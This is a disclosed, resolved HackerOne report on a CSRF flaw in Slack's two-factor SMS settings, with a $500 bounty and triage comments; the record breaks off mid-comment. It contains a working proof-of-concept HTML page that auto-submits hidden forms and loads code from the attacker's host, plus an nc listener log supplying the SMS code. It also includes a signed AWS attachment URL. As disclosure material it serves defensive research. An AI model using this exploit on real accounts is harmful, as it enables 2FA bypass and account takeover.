{"id":155774,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTU3NzQ=","url":"https://hackerone.com/reports/155774","title":"CSRF - Add optional two factor mobile number","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-08-01T10:54:51.599Z","submitted_at":"2016-08-01T10:54:51.599Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"nhavis","url":"/nhavis","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":69,"url":"https://hackerone.com/slack","handle":"slack","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/069/683fee312381bc46cadc7ea1950abc87944d12c3_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/069/683fee312381bc46cadc7ea1950abc87944d12c3_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Slack","twitter_handle":"slackhq","website":"https://slack.com","about":"All your team communication in one place, instantly searchable, and available wherever you go."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2016-08-17T21:39:53.991Z","bug_reporter_agreed_on_going_public_at":"2016-08-12T00:02:41.505Z","team_member_agreed_on_going_public_at":"2016-08-17T21:39:53.836Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Description\n====================\nAdding a mobile number for 2-factor authentication is vulnerable to CSRF, allowing an attacker to bypass 2-factor authentication. An attacker would be able to force the logged in user to add a new mobile number for 2-factor authentication. The attacker would then receive the SMS code and automatically make the victim verify it (in Javascript). When the attacker attempts to login to the victim's account, the verification code can then be sent to the attacker's mobile number. \n\nAn attacker could be anyone trying to bypass 2-factor authentication, for example:\n1. Anyone who already has the password to an account.\n2. A company's IT administrator who has access to the user's e-mail and can reset the password.\n\nI have provided a complete Proof of Concept without the **crumb** parameter, which I have manually verified myself.\n\nVulnerable URL:\n====================\n* /account/settings/2fa_sms\n\nRoot cause:\n====================\nServer does not validate the existence or value of the **crumb** parameter containing the CSRF token.\n\nSample vulnerable request:\n====================\n```\nPOST /account/settings/2fa_sms HTTP/1.1\nHost: cs-sa.slack.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-GB,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nCookie: REDACTED=REDACTED\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 109\n\nverify_two_factor=1\u0026backup=\u0026app=\u0026primary_phone_number=%2B61+0421653999\u0026country_code=AU\u0026phone_number=421653999\n```\n\nAttack flow:\n====================\n1. Attacker sends logged in slack user a link and slack user clicks it.\n2. The link contains HTML and Javascript code that forces the victim in to adding a new 2-factor mobile number (**slackcsrf.html** provided below). The code does not contain the **crumb** parameter.\n3. The code also connects back to the attacker's machine waiting for the attacker to enter the code so it can be used for verification (within seconds and potentially automatically).\n4. The attacker receives the code via SMS and sends it back to the victim. (**Attacker web server** provided below)\n5. The HTML code forces the victim to verify the new mobile number.\n6. The mobile number has now been added to the victim's account for 2FA.\n7. The attacker logs in and bypasses 2FA by requesting the code with the secondary mobile number.\n\nslackcsrf.html:\n---------------------\n```\n\u003chtml\u003e\n\u003cbody\u003e\n\u003cIFRAME style=\"display:none\" name=\"hidden-form\"\u003e\u003c/iframe\u003e\n    \u003cform action=\"https://cs-sa.slack.com/account/settings/2fa_sms\" method=\"POST\" target=\"hidden-form\" name=\"pocframe\"\u003e\n      \u003cinput type=\"hidden\" name=\"verify\u0026#95;two\u0026#95;factor\" value=\"1\" /\u003e\n      \u003cinput type=\"hidden\" name=\"backup\" value=\"\" /\u003e\n      \u003cinput type=\"hidden\" name=\"app\" value=\"\" /\u003e\n      \u003cinput type=\"hidden\" name=\"country\u0026#95;code\" value=\"AU\" /\u003e\n      \u003cinput type=\"hidden\" name=\"phone\u0026#95;number\" value=\"421653999\" /\u003e\n    \u003c/form\u003e\n\u003cscript\u003edocument.pocframe.submit();\u003c/script\u003e\n\n\u003cscript src=\"http://192.168.1.82:8080/a\"\u003e\u003c/script\u003e\n\u003cIFRAME style=\"display:none\" name=\"hidden-form2\"\u003e\u003c/iframe\u003e\n    \u003cform action=\"https://cs-sa.slack.com/account/settings/2fa_sms\" method=\"POST\" target=\"hidden-form2\" name=\"pocframe2\"\u003e\n      \u003cinput type=\"hidden\" name=\"verify\u0026#95;two\u0026#95;factor\" value=\"1\" /\u003e\n      \u003cinput type=\"hidden\" name=\"backup\" value=\"1\" /\u003e\n      \u003cinput type=\"hidden\" name=\"app\" value=\"\" /\u003e\n      \u003cinput type=\"hidden\" name=\"formatted\u0026#95;phone\u0026#95;number\" value=\"\u0026#43;61\u0026#32;421653999\" /\u003e\n      \u003cinput type=\"hidden\" name=\"country\u0026#95;code\" value=\"AU\" /\u003e\n      \u003cinput type=\"hidden\" id=\"scode\" name=\"confirmation\u0026#95;code\" value=\"\" /\u003e\n    \u003c/form\u003e\n\u003cscript\u003e\n\tdocument.getElementById(\"scode\").value = scode;\n\tdocument.pocframe2.submit();\n\u003c/script\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n```\n\nAttacker web server:\n---------------------\n```\nroot@foxtrotter:/var/www/html# nc -nlvp 8080\nlistening on [any] 8080 ...\nconnect to [192.168.1.82] from (UNKNOWN) [192.168.1.81] 56194\nGET /a HTTP/1.1\nHost: 192.168.1.82:8080\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0\nAccept: */*\nAccept-Language: en-GB,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://192.168.1.82/slackcsrf.html\nConnection: close\nCache-Control: max-age=0\n\nHTTP/1.1 200 OK\n\nscode=196206;\n```\n","vulnerability_information_html":"\u003ch1 id=\"description\"\u003eDescription\u003c/h1\u003e\n\n\u003cp\u003eAdding a mobile number for 2-factor authentication is vulnerable to CSRF, allowing an attacker to bypass 2-factor authentication. An attacker would be able to force the logged in user to add a new mobile number for 2-factor authentication. The attacker would then receive the SMS code and automatically make the victim verify it (in Javascript). When the attacker attempts to login to the victim\u0026#39;s account, the verification code can then be sent to the attacker\u0026#39;s mobile number. \u003c/p\u003e\n\n\u003cp\u003eAn attacker could be anyone trying to bypass 2-factor authentication, for example:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eAnyone who already has the password to an account.\u003c/li\u003e\n\u003cli\u003eA company\u0026#39;s IT administrator who has access to the user\u0026#39;s e-mail and can reset the password.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eI have provided a complete Proof of Concept without the \u003cstrong\u003ecrumb\u003c/strong\u003e parameter, which I have manually verified myself.\u003c/p\u003e\n\n\u003ch1 id=\"vulnerable-url\"\u003eVulnerable URL:\u003c/h1\u003e\n\n\u003cul\u003e\n\u003cli\u003e/account/settings/2fa_sms\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch1 id=\"root-cause\"\u003eRoot cause:\u003c/h1\u003e\n\n\u003cp\u003eServer does not validate the existence or value of the \u003cstrong\u003ecrumb\u003c/strong\u003e parameter containing the CSRF token.\u003c/p\u003e\n\n\u003ch1 id=\"sample-vulnerable-request\"\u003eSample vulnerable request:\u003c/h1\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePOST /account/settings/2fa_sms HTTP/1.1\nHost: cs-sa.slack.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-GB,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nCookie: REDACTED=REDACTED\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 109\n\nverify_two_factor=1\u0026amp;backup=\u0026amp;app=\u0026amp;primary_phone_number=%2B61+0421653999\u0026amp;country_code=AU\u0026amp;phone_number=421653999\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch1 id=\"attack-flow\"\u003eAttack flow:\u003c/h1\u003e\n\n\u003col\u003e\n\u003cli\u003eAttacker sends logged in slack user a link and slack user clicks it.\u003c/li\u003e\n\u003cli\u003eThe link contains HTML and Javascript code that forces the victim in to adding a new 2-factor mobile number (\u003cstrong\u003eslackcsrf.html\u003c/strong\u003e provided below). The code does not contain the \u003cstrong\u003ecrumb\u003c/strong\u003e parameter.\u003c/li\u003e\n\u003cli\u003eThe code also connects back to the attacker\u0026#39;s machine waiting for the attacker to enter the code so it can be used for verification (within seconds and potentially automatically).\u003c/li\u003e\n\u003cli\u003eThe attacker receives the code via SMS and sends it back to the victim. (\u003cstrong\u003eAttacker web server\u003c/strong\u003e provided below)\u003c/li\u003e\n\u003cli\u003eThe HTML code forces the victim to verify the new mobile number.\u003c/li\u003e\n\u003cli\u003eThe mobile number has now been added to the victim\u0026#39;s account for 2FA.\u003c/li\u003e\n\u003cli\u003eThe attacker logs in and bypasses 2FA by requesting the code with the secondary mobile number.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch2 id=\"slackcsrf-html\"\u003eslackcsrf.html:\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;IFRAME\u003c/span\u003e \u003cspan class=\"na\"\u003estyle=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;display:none\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden-form\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;/iframe\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;form\u003c/span\u003e \u003cspan class=\"na\"\u003eaction=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;https://cs-sa.slack.com/account/settings/2fa_sms\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003emethod=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;POST\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003etarget=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden-form\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;pocframe\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;verify\u0026amp;#95;two\u0026amp;#95;factor\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;1\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;backup\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;app\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;country\u0026amp;#95;code\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;AU\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;phone\u0026amp;#95;number\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;421653999\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/form\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;script\u0026gt;\u003c/span\u003e\u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003epocframe\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esubmit\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026lt;/script\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"nt\"\u003e\u0026lt;script \u003c/span\u003e\u003cspan class=\"na\"\u003esrc=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://192.168.1.82:8080/a\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;/script\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;IFRAME\u003c/span\u003e \u003cspan class=\"na\"\u003estyle=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;display:none\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden-form2\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;/iframe\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;form\u003c/span\u003e \u003cspan class=\"na\"\u003eaction=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;https://cs-sa.slack.com/account/settings/2fa_sms\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003emethod=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;POST\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003etarget=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden-form2\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;pocframe2\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;verify\u0026amp;#95;two\u0026amp;#95;factor\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;1\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;backup\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;1\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;app\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;formatted\u0026amp;#95;phone\u0026amp;#95;number\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026amp;#43;61\u0026amp;#32;421653999\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;country\u0026amp;#95;code\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;AU\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eid=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;scode\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;confirmation\u0026amp;#95;code\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/form\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;script\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003egetElementById\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003escode\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003evalue\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003escode\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003epocframe2\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esubmit\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/script\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"attacker-web-server\"\u003eAttacker web server:\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eroot@foxtrotter:/var/www/html# nc -nlvp 8080\nlistening on [any] 8080 ...\nconnect to [192.168.1.82] from (UNKNOWN) [192.168.1.81] 56194\nGET /a HTTP/1.1\nHost: 192.168.1.82:8080\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0\nAccept: */*\nAccept-Language: en-GB,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://192.168.1.82/slackcsrf.html\nConnection: close\nCache-Control: max-age=0\n\nHTTP/1.1 200 OK\n\nscode=196206;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":108852,"file_name":"slackcsrf.JPG","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/108/852/bc0782fd0be1df444d43fe8bf9af145bd579dec1/slackcsrf.JPG?response-content-disposition=attachment%3B%20filename%3D%22slackcsrf.JPG%22%3B%20filename%2A%3DUTF-8%27%27slackcsrf.JPG\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T043509Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026X-Amz-Signature=0a07098e587fe6d28dba1f3023179e986f46133ae882308215fbc6418c6aef9c","file_size":35102,"type":"image/jpeg"}],"allow_singular_disclosure_at":"2016-09-11T00:02:41.652Z","allow_singular_disclosure_after":-135664347.58960077,"singular_disclosure_allowed":true,"vote_count":5,"voters":["lucky_sen","kxyry","dudez","ibram","dyabla"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1099410,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This also works when a Slack user doesn't have 2FA enabled yet - this means the CSRF could be used in a mass Denial of Service attack as each victim would not be able to login to their account.","markdown_message":"\u003cp\u003eThis also works when a Slack user doesn\u0026#39;t have 2FA enabled yet - this means the CSRF could be used in a mass Denial of Service attack as each victim would not be able to login to their account.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-01T11:19:27.033Z","updated_at":"2016-08-01T11:19:27.033Z","actor":{"username":"nhavis","cleared":false,"url":"/nhavis","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1102241,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Can you confirm receipt of the issue?","markdown_message":"\u003cp\u003eCan you confirm receipt of the issue?\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-02T13:49:22.023Z","updated_at":"2016-08-02T13:49:22.023Z","actor":{"username":"nhavis","cleared":false,"url":"/nhavis","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1102650,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @nhavis,\n\nSorry for the delay here - we'll be triaging this shortly.\n\nThanks!\nMax","markdown_message":"\u003cp\u003eHi \u003ca href=\"/nhavis\"\u003e@nhavis\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eSorry for the delay here - we\u0026#39;ll be triaging this shortly.\u003c/p\u003e\n\n\u003cp\u003eThanks!\u003cbr\u003e\nMax\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-02T17:10:41.605Z","updated_at":"2016-08-02T17:10:41.605Z","actor":{"username":"maxfeldman","cleared":false,"url":"/maxfeldman","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/613/37b54dbac5da0a42db471713959c8bf2de89a12d_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1102896,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"@nhavis we've triaged this and are working on a fix!","markdown_message":"\u003cp\u003e\u003ca href=\"/nhavis\"\u003e@nhavis\u003c/a\u003e we\u0026#39;ve triaged this and are working on a 